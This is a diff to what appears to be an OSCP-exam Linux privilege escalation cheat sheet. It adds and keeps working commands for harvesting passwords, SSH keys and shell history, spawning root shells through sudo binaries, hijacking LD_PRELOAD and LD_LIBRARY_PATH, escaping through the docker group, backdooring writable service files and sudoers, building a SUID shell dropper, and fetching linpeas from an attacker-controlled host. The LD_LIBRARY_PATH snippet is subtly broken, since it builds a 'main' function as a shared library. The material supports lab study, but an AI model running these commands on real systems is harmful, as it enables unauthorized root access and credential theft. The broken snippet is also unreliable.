@@ -26,6 +26,17 @@ w
 cat /etc/crontab
 ls -la /etc/cron*
 
+# Search for passwords in config files
+grep -Ri "password" /etc 2>/dev/null
+grep -Ri "pass" /home 2>/dev/null
+
+# Look for SSH keys
+find / -name "id_rsa" 2>/dev/null
+
+# History
+cat ~/.bash_history
+
+
 ======================================================================
 # 2. SUID ENUMERATION
 ======================================================================
@@ -164,16 +175,11 @@ grep -Ri "password" /etc/nginx 2>/dev/null
 ======================================================================
 # ⭐ 12. SUDO WITHOUT PASSWORD (VERY COMMON OSCP PRIVESC)
 ======================================================================
-# List what you can run as root
 sudo -l
 
-# If you see something like:
-#   (root) NOPASSWD: /usr/bin/python3
-# Use GTFOBins:
+# If:
+# (root) NOPASSWD: /usr/bin/python3
 sudo python3 -c 'import os; os.system("/bin/bash")'
-
-# Generic:
-sudo <binary> (GTFOBins command)
 
 
 ======================================================================
@@ -185,60 +191,98 @@ sudo <binary> (GTFOBins command)
 
 # LD_PRELOAD privesc
 echo 'void __attribute__((constructor)) init(){setuid(0); system("/bin/bash");}' > /tmp/x.c
-
 gcc -shared -fPIC /tmp/x.c -o /tmp/x.so
-
-sudo LD_PRELOAD=/tmp/x.so <anything>
-		Example: sudo LD_PRELOAD=/tmp/x.so ls
+sudo LD_PRELOAD=/tmp/x.so ls
 
 
 ======================================================================
-# ⭐ 14. DOCKER / LXC PRIVESC (COMMON IN OSCP LABS)
+# ⭐ NEW (IMPORTANT) 14. LD_LIBRARY_PATH PRIVESC
 ======================================================================
-# Check membership
+# If a sudoer command uses a library you can override:
+
+echo 'int main(){ setuid(0); system("/bin/bash"); }' > /tmp/lib.c
+gcc -shared -fPIC -o /tmp/libhijack.so /tmp/lib.c
+sudo LD_LIBRARY_PATH=/tmp <vulnerable_binary>
+
+
+======================================================================
+# ⭐ NEW (IMPORTANT) 15. SUDO/SUID SHELL ESCAPE QUICK COMMANDS
+======================================================================
+# Extremely common OSCP privesc:
+
+sudo find . -exec /bin/bash \; -quit
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo vim -c ':!/bin/bash'
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo ftp
+sudo more /etc/passwd → !/bin/bash
+
+
+======================================================================
+# ⭐ 16. DOCKER / LXC PRIVESC (COMMON IN OSCP LABS)
+======================================================================
 id
-# if you see "docker" → you're root
+# if user in docker group → root
 
-# Escape:
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
-# LXC
-lxc image list
-lxc init ubuntu privesc -c security.privileged=true
-lxc config device add privesc host-root disk source=/ path=/mnt/root
-lxc start privesc
-lxc exec privesc bash
-
 
 ======================================================================
-# ⭐ 15. BINARY HIJACKING (.service, .sh inside /etc/init.d)
+# ⭐ 17. BINARY HIJACKING (.service, .sh inside /etc/init.d)
 ======================================================================
-# Look for writable service files
 find /etc/systemd/system -writable -type f 2>/dev/null
 find /etc/init.d -writable -type f 2>/dev/null
 
-# If writable:
+# Exploit:
 echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> servicefile
 systemctl daemon-reload
 systemctl start servicefile
 
 
 ======================================================================
-# ⭐ 16. KERNEL EXPLOITS CHECK (USE ONLY IF ALLOWED)
+# ⭐ NEW (IMPORTANT) 18. WEAK SUDOERS FILE
 ======================================================================
-# Check kernel:
+# If /etc/sudoers or /etc/sudoers.d/* is writable:
+
+echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+sudo bash
+
+
+======================================================================
+# ⭐ NEW (IMPORTANT) 19. SUID SHELLCODE DROPPER
+======================================================================
+# If you can compile locally + SUID binary exists:
+cat << 'EOF' > /tmp/s.c
+int main(){ setuid(0); system("/bin/bash"); }
+EOF
+
+gcc /tmp/s.c -o /tmp/s
+chmod +s /tmp/s
+/tmp/s
+
+
+======================================================================
+# ⭐ NEW (IMPORTANT) 20. APACHE / NGINX MISCONFIG PRIVESC
+======================================================================
+# Writable webroot → upload cron or sudo binary
+find /var/www -writable -type f 2>/dev/null
+
+# Check running web process:
+ps aux | grep apache
+ps aux | grep nginx
+
+# If running as root → dangerous misconfig
+
+
+======================================================================
+# 21. KERNEL EXPLOITS CHECK (USE ONLY IF ALLOWED)
+======================================================================
 uname -r
-
-# Search exploits:
-searchsploit linux kernel <version>
-
-# Example:
-gcc exploit.c -o exp
-./exp
+searchsploit linux kernel
 
 
 ======================================================================
-# 17. NETWORK ENUM FROM INSIDE THE BOX
+# 22. NETWORK ENUM FROM INSIDE THE BOX
 ======================================================================
 ip a
 route -n
@@ -246,13 +290,12 @@ cat /etc/resolv.conf
 arp -a
 ss -tulnp
 
-# Discover internal network pivot targets
 nmap -sn 10.0.0.0/24
 nmap -Pn -p 22,80,445 10.0.0.0/24
 
 
 ======================================================================
-# 18. AUTOMATED ENUM (LAST RESORT)
+# 23. AUTOMATED ENUM (LAST RESORT)
 ======================================================================
 wget http://$localip/linpeas.sh -O /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
